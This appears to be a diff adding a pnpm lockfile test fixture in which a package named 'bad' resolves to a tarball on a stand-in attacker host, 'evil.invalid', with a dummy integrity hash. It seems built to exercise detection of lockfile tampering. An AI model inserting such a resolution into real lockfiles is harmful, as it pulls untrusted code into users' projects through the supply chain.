@@ -1,0 +1,9 @@
+lockfileVersion: '9.0'
+
+packages:
+
+  bad@1.0.0:
+    resolution:
+      integrity: sha512-x
+      tarball: >-
+        https://evil.invalid/x.tgz
